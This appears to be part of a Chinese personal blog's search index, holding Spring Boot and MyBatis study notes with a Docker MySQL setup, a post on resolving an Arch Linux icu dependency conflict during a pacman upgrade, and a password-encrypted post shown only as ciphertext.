class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker start mysql</span><br></pre></td></tr></table></figure><h5 id="命令行方式连接-docker-mysql"><a href="#命令行方式连接-docker-mysql" class="headerlink" title="命令行方式连接 docker mysql"></a>命令行方式连接 docker mysql</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker <span class="built_in">exec</span> -it container_id mysql -u root -proot</span><br></pre></td></tr></table></figure><p>将 container_id 替换成自己的，查看方式为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps</span><br><span class="line">CONTAINER ID   IMAGE   COMMAND   CREATED   STATUS   PORTS   NAMES                               </span><br><span class="line">0cc1946af19d   mysql   <span class="string">&quot;docker-entrypoint.s…&quot;</span>   4 months ago   Up 5 minutes   0.0.0.0:3306-&gt;3306/tcp, :::3306-&gt;3306/tcp, 33060/tcp   mysql</span><br></pre></td></tr></table></figure><h5 id="添加起步依赖"><a href="#添加起步依赖" class="headerlink" title="添加起步依赖"></a>添加起步依赖</h5><ol><li>mybatis</li></ol><p>官网：<a href="https://mybatis.org/spring-boot-starter/mybatis-spring-boot-autoconfigure/zh/index.html">https://mybatis.org/spring-boot-starter/mybatis-spring-boot-autoconfigure/zh/index.html</a></p><blockquote><p>刚开始 mybatis 用了 3.0.2，报了诸如 <code>java.lang.IllegalStateException: Failed to load ApplicationContext for [WebMergedContextConfiguration@57435801</code> 的错误，后来发现其实是没有引入 <code>mybatis-spring-boot-starter-test</code> 依赖。</p><p>但是第二次运行把 <code>mybatis-spring-boot-starter-test</code> 删了似乎也没报错？？？</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>mysql</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--&lt;scope&gt;runtime&lt;/scope&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="配置-datasource"><a href="#配置-datasource" class="headerlink" title="配置 datasource"></a>配置 datasource</h5><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line"><span class="attr">datasource:</span></span><br><span class="line">        <span class="attr">url:</span> <span class="string">jdbc:mysql:///数据库名</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">root</span></span><br><span class="line">        <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br></pre></td></tr></table></figure><h5 id="定义表和实体类"><a href="#定义表和实体类" class="headerlink" title="定义表和实体类"></a>定义表和实体类</h5><ol><li>在 mysql 中创建好需要的数据库和数据表</li><li>在项目中创建实体类（&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;fish&#x2F;initializerhelloworld&#x2F;<code>domain/User</code>），自行设置 get 和 set 方法</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fish.initializerhelloworld.domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="编写-mapper"><a href="#编写-mapper" class="headerlink" title="编写 mapper"></a>编写 mapper</h5><p>在 &#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;fish&#x2F;initializerhelloworld&#x2F;<code>mapper/UserMapper</code> 下，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fish.initializerhelloworld.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fish.initializerhelloworld.domain.User;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Select;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Select(&quot;selct * from t_user&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findAll</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="编写测试"><a href="#编写测试" class="headerlink" title="编写测试"></a>编写测试</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fish.initializerhelloworld.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fish.initializerhelloworld.domain.User;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Select;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Repository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select(&quot;select * from t_user&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findAll</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="XML-配置"><a href="#XML-配置" class="headerlink" title="XML 配置"></a>XML 配置</h5><p>先不学了。</p><h2 id="SpringBoot-原理分析"><a href="#SpringBoot-原理分析" class="headerlink" title="SpringBoot  原理分析"></a>SpringBoot  原理分析</h2><h3 id="SpringBoot-自动配置"><a href="#SpringBoot-自动配置" class="headerlink" title="SpringBoot 自动配置"></a>SpringBoot 自动配置</h3><h4 id="Condition"><a href="#Condition" class="headerlink" title="Condition"></a>Condition</h4><p>Spring4.0 加入的条件判断，可以实现选择性创建 Bean 的功能。</p><p>案例：在 Spring 的 IOC 容器中有一个 Admin Beab.</p><ol><li>导入 Jedis 坐标后，加载该 Bean; 若没导入，则不加载。</li></ol><p>导坐标。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>redis.clients<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jedis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>先创建一个 Admin 类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fish.initializerhelloworld.domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Admin</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建 ClassCondition 类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fish.initializerhelloworld.condition;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Condition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ConditionContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.type.AnnotatedTypeMetadata;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassCondition</span> <span class="keyword">implements</span> <span class="title class_">Condition</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">matches</span><span class="params">(ConditionContext context, AnnotatedTypeMetadata metadata)</span> &#123;</span><br><span class="line">        <span class="comment">// 1. 导入 Jedis 后返回 true</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;redis.clients.jedis.Jedis&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建 AdminConfig.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fish.initializerhelloworld.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fish.initializerhelloworld.condition.ClassCondition;</span><br><span class="line"><span class="keyword">import</span> com.fish.initializerhelloworld.domain.Admin;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Conditional;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdminConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@Conditional(ClassCondition.class)</span></span><br><span class="line">    <span class="keyword">public</span> Admin <span class="title function_">admin</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Admin</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="切换外部服务器"><a href="#切换外部服务器" class="headerlink" title="切换外部服务器"></a>切换外部服务器</h4>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一次archlinux更新失败</title>
      <link href="/2024/05/21/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1archlinux%E6%9B%B4%E6%96%B0%E5%A4%B1%E8%B4%A5/"/>
      <url>/2024/05/21/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1archlinux%E6%9B%B4%E6%96%B0%E5%A4%B1%E8%B4%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>由于毕业这段时间一直在mac上写作，这台电脑用的不是太多，忘记更新系统了。</p><p>和朋友打了电话，被骂考上研究生就开始狂摆了55555。</p><p>遂重整旗鼓，开始coding了。</p><p>在更新系统时，出现以下错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[sakana@archlinux ~]$ sudo pacman -Syu</span><br><span class="line">[sudo] password <span class="keyword">for</span> sakana:</span><br><span class="line">:: Synchronizing package databases...</span><br><span class="line"> core is up to <span class="built_in">date</span></span><br><span class="line"> extra is up to <span class="built_in">date</span></span><br><span class="line"> archlinuxcn is up to <span class="built_in">date</span></span><br><span class="line">:: Starting full system upgrade...</span><br><span class="line">:: Replace dbus-python with extra/python-dbus? [Y/n]</span><br><span class="line">resolving dependencies...</span><br><span class="line">looking <span class="keyword">for</span> conflicting packages...</span><br><span class="line">error: failed to prepare transaction (could not satisfy dependencies)</span><br><span class="line">:: installing icu (75.1-1) breaks dependency <span class="string">&#x27;libicui18n.so=74-64&#x27;</span> required by electron22</span><br><span class="line">:: installing icu (75.1-1) breaks dependency <span class="string">&#x27;libicuuc.so=74-64&#x27;</span> required by electron22</span><br><span class="line">:: installing icu (75.1-1) breaks dependency <span class="string">&#x27;libicui18n.so=74-64&#x27;</span> required by electron25</span><br><span class="line">:: installing icu (75.1-1) breaks dependency <span class="string">&#x27;libicuuc.so=74-64&#x27;</span> required by electron25</span><br></pre></td></tr></table></figure><h3 id="解决措施"><a href="#解决措施" class="headerlink" title="解决措施"></a>解决措施</h3><p>通过 google, 找到了一个解决方案：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pacman -Rd --nodeps icu</span><br><span class="line">pacman -Syy icu</span><br><span class="line">pacman -Syyu</span><br></pre></td></tr></table></figure><h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><p>首先，报错为以下四句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">:: installing icu (75.1-1) breaks dependency <span class="string">&#x27;libicui18n.so=74-64&#x27;</span> required by electron22</span><br><span class="line">:: installing icu (75.1-1) breaks dependency <span class="string">&#x27;libicuuc.so=74-64&#x27;</span> required by electron22</span><br><span class="line">:: installing icu (75.1-1) breaks dependency <span class="string">&#x27;libicui18n.so=74-64&#x27;</span> required by electron25</span><br><span class="line">:: installing icu (75.1-1) breaks dependency <span class="string">&#x27;libicuuc.so=74-64&#x27;</span> required by electron25</span><br></pre></td></tr></table></figure><p><code>icu</code> 在 archlinux 官网的页面为：<a href="https://archlinux.org/packages/core/x86_64/icu/">https://archlinux.org/packages/core/x86_64/icu/</a></p><p>他的全名是<code>International Components for Unicode library</code>，也就是用于 unicode lib 的国际编码组件。</p>]]></content>
      
      
      
        <tags>
            
            <tag> config </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Statement-fot-RIT</title>
      <link href="/2024/05/13/statement/"/>
      <url>/2024/05/13/statement/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="48183b78169e34a45fb413f2c98a01e0000fe059322ab4b4d746e4b307479526">96b08424690f950154d47d2ac302ea965f93349137ebe438012e69a9dc2875753b62192594c8c50e3bce10ebe72344a49ad79a60e12336bbfbf491b44955f884298d6a7f03c3000e48d9965c522a04fdfb96a1f519324eeb290e6d3e2639670f9a9d0dadd7fe487491d429a5e1f1daf7014698a0fd3b9bb5a91b120ccdd96b21e0d9e3339c8999e8a35640fb19d0053d5c6ae42b31a062cb42af8e40d2adcf351e3bcefa3c6be29b5f094940e667514978f98436ffb319281b7fadabfbbda8e382afc36083f5b09977f8fb4615ae82c8e61e4339cce7a4661956b331cceaaf00a8e8b5433b6e46f54667b820518c430073839142f1c6fd0300b78b115f67a9814f9401a892df815b27b9d8786d1a9027cf5948aa6decaa5477752b67676963bb6d96db630d01aa01eb80b466193a9e64a8be6edc27680e5b530edc3632b4efda30090aa06e30242a1f472f72b9395c85a0dd9ce1d8293bcf0e59a0ad3541376c60823e02d08ea299ec1be760f9e7763ba06977d299e4efaf49fe89d3393c742bdf10c03cd1f963439d832e41aea0125d6b5345966b5b2657c50caa09aa0fc63eb8efa3fa5b8d39707fb78b3ab60e01f3c52edec94896fa481aadcbb0fae8760505685523f1cdcc2ea284b96895a64db7eb3dcbfcaf63ab9143e24f19d6b5b0c0e10284c4080f7412faedbd057e87c7a228efdde96c2fdabb70f11a79506744729313717f3f5aa288da796c68c56c57bab2c4b18f7240047362004a0cfd84d2f9e2532a4d47227fe8df9c5ef48476a7fb4446eaefb9763dc0045c010c312e4e5fe443cab7cd9dded4db84787379ce4ff1b58c9afae18a02336686290bb623f787cd1ccfb278c7a92e63cbd4b00d70fce103f1b82c601db8e67f03849e6fac97ce3ee206915040e7a05aca476749b965646331386e9945593b285891ef662c7b097263141878c6402076a87af039abbf4cb4fc0f6c274aa7c00d7ce06519188dbbfc937d756a1000792831e36745a00ce3f2638b7a542b5c9ff7ad96b5729c0e8a63447937c68982dab7dbf3bfddf878f4fdd0c48e93b11f2c5e1feabaa076d2cb8f8d52b9f148461d7bd9b970a6a3a3701b942acab45927ca0f4e0ad92c0424c54446c3258cdb538fff620e1fd18be980925e6edd156b54abc59f17f971224e2cf3aac9ec7947c3f6c40391e1846db08219198df5b1247e72bdbd7829c13a5cf5d9bf1187fcb54717a9d5d7d554780ba9f0787cc81ec96c53f0db8e126563307c9322056ebde189bc7dc6f4eb7155c07e97339a81e38ee14b69782fe27d529538fb3dbda0badf65fe914ce587a70dea45b0f16ae339cea4144b7d7a89994df77ab76d525ec45d8c4e26fea901d79558f90b6f8a68de090ff7c664ba884f4b2bc31230002e65353785a96c60ed4bd1ebed5d7dd0dbf78a80d6c3ea43143259e7807436780b703c2521fddfd8363a3ce3c7dd33362685f561988a2a906b0bd9f51fcac25abaf244025fe3f93445f80d21e63767534330eabe60ae6578ab3f5f4a4eaa9b6e31e498836427381d3ab7f16ef403aa690a48991d5651af3560692ea85fd46278b7b9041f5e5eaed0e0e6e82f960d10ae3b187b43735acca7a1508daa08db80dfcfa25bb55fb2928a5ff4b88163306162e7b4ded93aad3a5d742c10d36280402e90825b439ff65d0bfba118b86bbadc7fca2f2259759e868c6eb2b89a32037821affb6b8c6cc3dff34667de00cd1e78c5c2086b0cc8c80ddb0f09af2ed0f259c7c7365605655a07252867165247e1a360286f08a62ef9b74194dc03e299c37ef7d1295a82ea8383c4f54f2a306ab39aee7b5800155b6541e3fb9b161127099c6c9a77443014c9b64295a8686f8722f8dd42f162237d7e0877926b7c71ccfc3d0acba98ba7e1cfe6ef3b2d21fb0429927be13c8f1bedcea426574972533a52f92d968a3c27194ce04877ceee1cd2ac9ac367b667aefe94062bac3feda106f4563e392837c9cf36dfad81f59b2bfaa52b7f74bfbd196fd002ef1118347b8e9491deb1d4987bb5c41f077f1ff5c1e670163ac08ee5507572a158bb0c28f118b5e2756909feaeb53ef8a11e64c7b98a96ab783fcb52620d70a40721784cd6b05f84d0a4d12b6ecbe3e4bc55f1ff15855be4345cc5b261fda3f780e725cf9b5be6b7463089852d8801c572149056721733e3c282cca6202a8dd7662f891ceb9407c34403daf778605e2f22364b0833579d85a7fe015a1b7f645bde4f3899f6ec063d1e4a5076f91206afaac0fb1afee0e4c85b1968e6b48b58d8fbc0c6e47d6c2a3616fa9ada76860080b4a0ef3e376f85897e2afa2610f87868d716892634189f386998b3e2ca8ce56bcf6b7379cd35fdd8c289fa50f862ded0369fe395dcb582fa0f4d400432fb56dc3f59ed3fb937afa22589815a56658015a6225d9643b37caf57650309a3472ab1fedf52590be2e3cecc58d5e9a4041732cac1b862483935fdc20023887b62d20a09bd50787407a3ba5589a0c281b57c0775ff39774407178b13ca3feebc746450145d3d364133b7a1be4b28390779f91e4f915041e43a4f0707cd8200cd3b9174f11a4e4d4e40ba59998f09227b69a5f7b93e73df5b2b74620eb0ca3ea310c853e3e172d51a3a518a48815d85cb2622191a0d36c70316b19d0c7e75142dde816361d05d1ad155f8e4c11c4761640c0e5da1c589702803062e8c14c38607111cfbde5e0ac486fd41aba2c5677978a8a155899e450c62d031427644dabc476192c154aa515ecbda424a1b55856a611f562b97f67c5cf547ce859661650493c59e66a228da992c7a0b83df10737002f5d8cd1354178aff1c8f5bafbe82a90af95bc2cbf5b75c6c5d7d7cc1c825d6c412e73986b5bd26a738667d4dd947fa7bd649b1501d7e316518ee7b3c493003d3a08fdc20c7f72c4d5d146c02d6b45d90f5ddd0d33876d06d899bc736a634b94b922cb414c4e019ec9afff4260e09beeb48da103953917567633f87f1f0d0f00b66ece24acffc5610920e872aa6c3bf65b691f9c7149ab57f429f2e36db36610cc97215340dd7f792c81c9be718abe351456189787752d0a90c486262ab598546e70b2d8793ac7b101a74e87e6efd75a2c96b46ae186d6961a307e85d285e7a422cc655fed75df684fe7cc75dfc84ac3e1a39912bb9f80e32f2cd820f7c955aec7b298939cdefd7618d256e07f2a9d3e8ab82788d4369721e322b77a8ba1f031a4779845d27d7ff3c79e3d64f18e6a9db9e3cbd39ef20281ee9fda1fdf48983f37ce7063788cd2b45d97631ab7ed11e9a3b5bdaa6a640fb73533183aee376f424bfc6830ee553ce7edc1269083e622deb68284265cb2eb5250ca9e2f90ce7af20a0a9282fd402ae5618ebbfcaf2fb5492d9bb91c061effc05205cb867d7af217464938254c2c06f544179877c621ccdc151c9da9959ca8713bedac465d6ec458b0732482c5eefb658440ef7b80d2e216bbfa767b5ea0b7744ce26936c29fa4b5d78a06121b586653f6c50c0105bb16afbee70ad05c629992013723a27ebf83ace55ce69b6371de5542e65c8542ee8dd5f16b2c7c9e0f9705ccd5c77e5037f7ab6b3398eb3c70197bde3064f8bf058c67b09d4c7600284fdcda8d54bb7057bc93ea588adb587aea9019ece02d2ac7ae641415d162f3e2e807b06d2b5f08f35bc9e45ce11e992454169d5122b5ba3c5e91919cc564f98105d896119027e432e9a8edc42d96559c22344d51f6481fcde8948690c9b9e1a744a90a4226e772ba7aa1c1e4cbc42f9347584ded6a98f392ee5a2099f0faf41f6571a53c6990d64aa4bf4628d13a4882dd17e97bed701301c3651af96a9bc8cdd80cd872476940d58633773da4526fe4cdc1708990a23fe006b645d19bc67e36390da0b4bc033a6ec129c7622be0b5daf20a2bc6ed4d4935596a142c167270535f1b631f1e170031f58b3d215bc071a55a67d7147ea8dd7681e4687d29e11ec180cd728c1c81dc807fbc7bee5435bc06c8eb07ea07b644decaf28a4548656ad8a2e6b1e7309f142c95027f1133c51f06ef9797f15cbd672cf56cec6f4dd37eaec0fb9a956cb67aa8cd29cdf946f055f48c984d5af9486c88b8487dc2b38bbb749e4965fb71d53edd757e099b71873765c5f53a780ff910d19c9f7dbbbb8f9b1db41e6f4725672ee1be086746120738b51bc9d525ee5426652ed1e4cbb7734cf4855bc06d0163714df25e3453dc3bcf6a0835a29f605f2a1e1d10c10600e3f89595562809225916e5e56a097e16012171d3c76ee2af6a4a966b460dfbda3b0cd309628ea7370fde14938d0674ea6a3551d360c2af85aebb89a1ee7495b2d20211e80a75cb3f3478458874bb6e037f639cac8450f272ed07766f7aecc5f0ed8b38f65a78525929d19069d3f3e89e693aa800794d711530881dbf7b64746131f3206374473afa600ba2b40322fe6bf754dcca3308de32d026907c664abee952a34c6c4bacfa0d0b00cd29288dc1fdea9052dc309600ee278893ec22f5ff5d942f2a3b517076bab501cce108de90eb25e809222622365d650a2f0d16456a01770f344ea2f3b0fdf5b92a6e77e75634498b94e9c2daf36bca5043d854bf724a0d814a004202a1e9786903de9190372f9443faafc3882b5689032c5d0df90ab8d7b02a0d443a90c3193609f496c00af1ff9db48c7c1f2e741010af118d847f2a2440618990730ed549360dbff0f422066f2b6421bd0354259309b201c82c5e93b93c61240a83c1b6188f7d5013a348cc2679e74228c1134bec3b82b570f67f9e3ffa0818bec6611d7ba6b9ea40a269dec5723fe8b33436fdf76337f11b15864b2465755c8e084eae26fc043e0c2d217e98d39a2e419fc4c7318a6e15b612831f6a4dec017ab2e1cf1d9723ac7de3e713cefd300685ab8193c575661c799694533bcb5694029527b0e1aaebd19f45f94d5e03a01c90b21c3233a696756b7a14d29ca876a8f3bccbcec37278d1af99394ae813f70c24234f708b89bf2bdcfc4c12528bfbcf50824994e9e13a42756baa3fff397df333237bbcad0f3df051d61d1b4eada72c1fa7426c644b8b01fda0e4ddefa7b79c6d3afa56fd4ab837b066867ff60b01032c06b150c6b0e735d5586e971aca69122e85994002a476162edc5a0ec7a359d86879a577d4ee6838a75a57f29bed4ca092a3dc5626b76d3c0248f0c363e36a7077d9a3f70868ca2412895dc2ce5dbffee277ba056932243bcaa703822773551dc568e3aa167e597c541c299030d409d0ee90297c2de23e900f3137fa87639a3fc08f7c2e265ea3d62764d9a90ebac10c701835cc5ae23ab1c93a084dc245e43252f23d3b8951bc648fcf38f7a81efc67bb8889ee587d70bb0f6a2fe9f1822b0d78c59b21ea8c4d1b26d24c6f597984292bedb7ca5cdf924c2066eb15db6633c947984c16960bad48c1471ddd8385f4d7d7809cf4d2d2eec7800d2e2ec4b7527fff78ad41efe90ca137d7e4c4901f67076bfb6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好，点击这里输入密码。</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path 